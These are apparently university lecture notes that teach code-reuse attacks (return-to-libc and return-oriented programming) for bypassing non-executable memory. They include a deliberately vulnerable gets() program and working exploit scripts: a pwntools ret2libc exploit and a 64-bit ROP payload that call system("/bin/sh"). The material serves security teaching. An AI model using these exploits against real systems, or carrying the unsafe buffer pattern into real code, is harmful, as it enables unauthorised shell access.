---
title:  "Lecture Notes: Basics of Code Reuse"
date:   2020-04-05 01:01:00
categories: notes lecture 
layout: post
challenges: heap1 heap2 heap3 stack4 stack5 stack6
---

**Updated April 9, 2020 to include a different soluton for the vuln binary.**

Up until now we've been focusing on a specific class of attacks: **code
injection**. In these attacks, the attacker injects their own code into a
vulnerable program and then hijacks the control flow of the program and
executes that injected code. 

We've also talked about a number of automated ways to defend against such
attacks. ("automated" here means that the defense can be implemented without
any changes to the source code). First, we can make it harder to leverage a
buffer overflow to hijack the control flow, e.g., by using stack canaries to
protect the return address saved on the stack or ASLR to randomize the location
of objects in memory. Second, we've discussed how memory permissions can make
it impossible to execute any code on the stack.  Specifically, by following a
simple invariant: memory that is writable cannot be executed and memory that is
executable cannot be writeable. Often this type of defense is called 
**setting the NX bit** or **data execution prevention (DEP)**, depending on the
specific implementation.  For this lecture we are going to focus on bypassing
restrictions on writable memory execution using **code reuse** attacks. 

With DEP, there is no location in memory that an attacker can both modify and
execute.  Consequently, data injected by the attacker (e.g., shellcode) will
always be treated as data (i.e., not as code). Fortunately (if you like
breaking software), there is a simple solution to this problem (simple in
concept, but tricky to implement in many situations): *reuse code that
is already in the binary.*

Below we introduce the two most basic code-reuse attacks: **return-to-libc**
and **return-oriented programming**. 

### Return-to-libc (ret2libc)

Return-to-libc is a code reuse attack that redirect control flow to execute
useful functions that are in commonly-used libraries (e.g., libc). A
particularly useful function is `system()`. The behavior of `system()` is
actually similar to basic shellcode: `system()` will create a child process and
execute the shell command specified by the arguments.  

Let's take a look at how a call to `system()` works in a 32-bit binary by
writing a simple program:

```
// Note: we can compile a 32-bit binary on a 64-bit system using: 
// `gcc -o sys32 -m32 sys.c`. 

#include <stdio.h>

void main() {
  system("echo peanut");
  //Uncomment this next line if you want to launch a shell
  //system("/bin/sh");
}

```

```
+pwndbg> disass *main
Dump of assembler code for function main:
   0x0804840b <+0>:	  push   ebp
   0x0804840c <+1>:	  mov    ebp,esp
   0x0804840e <+3>:	  push   0x80484b0
   0x08048413 <+8>:	  call   0x80482e0 <system@plt>
   0x08048418 <+13>:	add    esp,0x4
   0x0804841b <+16>:	mov    eax,0x0
   0x08048420 <+21>:	leave
   0x08048421 <+22>:	ret
End of assembler dump.

```


By looking at the disassembly of `main()`,  we see the address of the
command string ("echo peanut") is pushed to the stack immediately before the
`call` instruction.  We know from our discussion of 32-bit calling conventions
that this is the argument to `system`. A quick gdb command shows us that we are
right: `x/s 0x80484b0`. 


This calling convention should be familiar to us by now. What you might not
remember is that the `call` instruction will implicitly push the return address
(i.e., the address of the next instruction in `main`) on to the stack. Thus,
when we manually call `system`---during our ret2libc attack---we have to set up
the stack to include both the correct arguments and the pushed return address.
For this simple example, we don't really care what value we use for the return
address, but setting this value could be useful for chaining together calls to
libc functions. 

Let's draw out what the stack looks like the moment `system()` starts
executing, i.e., how the stack should look for our ret2libc attack to work. 

```
Note: Stack grows to the left, higher addresses to the right.
Arg: the address of the command string
ret: the saved return address


 +----+-----+--------------------------------+
 |ret | arg |                                |
 +----+-----+--------------------------------+
 ^
 |
 +

Top of the stack when system function starts executing.
```


Using our observation of how our simple test program calls system, we
can list the basic steps that are needed for a ret2libc attack using `system()`:
 1. find where the code for `system()` lives in memory,
 2. set up the stack (and/or registers for 64-bit binaries) with the proper
    arguments and a dummy return address, and 
 3. hijack the control-flow of the program to execute the desired function. 
 
 
### Our First ret2libc Exploit 

Let's try to apply our knowledge to a simple vulnerable program.

```c
// File: vuln.c 
// gcc -o vuln vuln.c -m32 -fno-stack-protector
#include <stdlib.h>
#include <stdio.h>


void main() {
  char buffer[64];
  gets(buffer);
}
```

```
+pwndbg> disass *main
Dump of assembler code for function main:
   0x0804840b <+0>:	lea    ecx,[esp+0x4]
   0x0804840f <+4>:	and    esp,0xfffffff0
   0x08048412 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048415 <+10>:	push   ebp
   0x08048416 <+11>:	mov    ebp,esp
   0x08048418 <+13>:	push   ecx
   0x08048419 <+14>:	sub    esp,0x44
   0x0804841c <+17>:	sub    esp,0xc
   0x0804841f <+20>:	lea    eax,[ebp-0x48]
   0x08048422 <+23>:	push   eax
   0x08048423 <+24>:	call   0x80482e0 <gets@plt>
   0x08048428 <+29>:	add    esp,0x10
   0x0804842b <+32>:	mov    eax,0x0
   0x08048430 <+37>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048433 <+40>:	leave
   0x08048434 <+41>:	lea    esp,[ecx-0x4]
   0x08048437 <+44>:	ret
End of assembler dump.
```

The added complication here is that our compiler inserted some instructions
(from `*main+0 to +7`) to properly align the stack and save the previous
location of the stack pointer. This code slightly complicates our exploit. We
aren't going to overwrite the saved return address, instead, we are going to
manipulate the value used to set the stack pointer, e.g., instructions
`*main+37 to +44`. Note, if we had complied with the flag
`-mpreferred-stack-boundary=2` then we could have targeted the saved return
address directly.  

Our attack will work as follows:
 1. Figure out the offset from the vulnerable buffer to the saved stack pointer.  
 2. Figure out the addresses of our environment variable, `system`, and the
    `/bin/sh` string. 
 3. Setup our environment variable with the needed stack layout.  
 4. Send the exploit string that will cause `esp` to point to our environment variable.  

**Step 1. Finding the Offset.** By sending a long cyclic string, we can use
information from the resulting core dump to find the offset from the start of
the vulnerable buffer to the saved stack pointer. In particular, we want to
examine the value in register `ecx` as that register is used in `*main+41` to
set the stack pointer. *Potential gotcha:* Note that if you used the fault
address given in the core you will get the wrong offset due to subtraction of
`0x4` from `ecx`.  


**Step 2. Finding useful addresses.** We can use the corefile directly to find
the address of the `WIN` environment variable. To find the address of `system`
and the `/bin/sh` string in libc, we are going to get the offsets directly from
the libc shared object file and add that to the runtime address of libc given
by corefile.   Note that we could pass an arbitrary string to `system` by
placing that string on the stack in our vulnerable buffer or throwing it in an
environment variable; however, the "/bin/sh" string already exists in the libc
code and its address tends to be more predictable than stack addresses.

**Step 3. Setting up the environment variable.** It is not enough to manipulate
the stack pointer to point at a location we control. We also need to make sure
that the new top of the stack is setup how system function is expecting. In
other words, we want to setup the appropriate arguments in our environment
variable. The notes in the previous section explain what this setup should look
like.  

**Step 4. Manipuate the stack pointer.** Finally, we want to modify the saved
stack pointer location so that it will instead point to our environment
variable. This manipulation will allow us to control the return address used by
the  `ret` instruction. We want our environment variable `WIN` to become the
new top of the stack so that the new return address will be `system`. 

Putting it all together we have our full attack:

```python
# file: exploit.py

import struct
import sys

from pwn import *

context.clear(arch='i386')

p = process('./vuln', env={'WIN':'Put ROP here'})

p.sendline(cyclic(128))
p.wait()

assert pack(p.corefile.ecx) in cyclic(128)

offset = cyclic_find(pack(p.corefile.ecx))

print "Offset: ", offset 
print "WIN addr: ", hex(p.corefile.env['WIN'])

libc = ELF(p.corefile.libc.path)

system_addr = libc.symbols.system + p.corefile.libc.start  
dummy_ret = 'aaaa'
binsh_str_addr = p.corefile.libc.find('/bin/sh') 

exploit_str = flat({offset:pack(p.corefile.env['WIN']+4)})
   
env_str = flat( 
    pack(system_addr), 
    dummy_ret, 
    pack(binsh_str_addr) 
    )

with open('input.txt', 'wb') as f:
    f.write(exploit_str)

p = process('./vuln', env = {'WIN':env_str})

p.sendline(exploit_str)
p.interactive()

```

### Return oriented programming

Now let's take a look at how system would be called in the 64-bit version of
our vulnerable binary. The primary difference between the 32 and 64-bit
binaries is that the arguments are passed via registers and not the stack (up
to a certain number of arguments). This change means that `system` is going to
looking for its  argument (i.e., the address of the "/bin/sh" string) in the
`rdi` register rather than on the stack.  This complicates our ret2libc attack
because now we have to find a way to load a particular value into the `rdi`
register, when before we just had to manipulate the stack layout a bit. To
solve this problem, we are going to add an extra step to our ret2libc attack.

Let's try to exploit our program: `gcc -o vuln64 vuln.c -fno-stack-protector`.
Like before, we are going to reuse code that is already in the program. So
first we find the address of system using gdb: `p &system`.

Here's the new bit. Now we want to find **gadgets** to that will do the work of
loading `rdi` for us.  In its simplest form, a gadget is a short sequence of
instructions ending in a return.  This technique is often called
**return-oriented programming**.

What we need is a gadget that will load a value from the stack (because we can
control what values are placed stack) into the correct argument register
(`rdi`).  Finding these gadgets is an art and often involves some manual
checking. For instance, we can use objdump to look at all of the instructions
until we find a useful gadget.  Fortunately, there are programs already
installed in EpicTreasure that make searching for gadgets easier. 

```
ROPgadget --binary vuln64 | grep "pop rdi"
``` 

Looks like there are a bunch of gadgets in the program, including one that will
do exactly what we need: pop a value off of the stack and into the argument
register. Note: the first column is the location of the gadget, use x/i in gdb to
to verify

```
0x00000000004005b3 : pop rdi ; ret
```

Now that we have the address of a useful gadget, we need to find our command
string "/bin/sh". We could do it the way we did previously (using strings and
grep on the .SO file), but let's do it directly in GDB this time: `find
&system,+9999999,"/bin/sh"`. Note, the program needs to be running for this
command to work.

Putting everything together, we have an attack that looks very similar to how
we exploited the 32-bit binary. The big difference is that added the additional
step to call our gadget and load the address of "/bin/sh" into `rdi`. 

```python
#file: rop.py
#output: r64.in
import struct
import sys

gadget_addr = 0x00000000004005b3
buff_addr = 0x7fffffffd560
ret_addr = 0x7fffffffd5a8
command_addr = 0x7ffff7b99d57
system_addr = 0x7ffff7a52390

padding_len = ret_addr - buff_addr

sys.stdout.write('a'*padding_len+struct.pack("<Q", gadget_addr) + struct.pack("<Q", command_addr)+ struct.pack("<Q", system_addr))

```

We got lucky in this case because we only needed to use a single gadget to set
up our register. In many cases, we may have to string together multiple gadgets
into a single **ROP chain** to achieve the desired results---for example,
imagine what we'd need to do if we are calling a function that requires
multiple arguments.


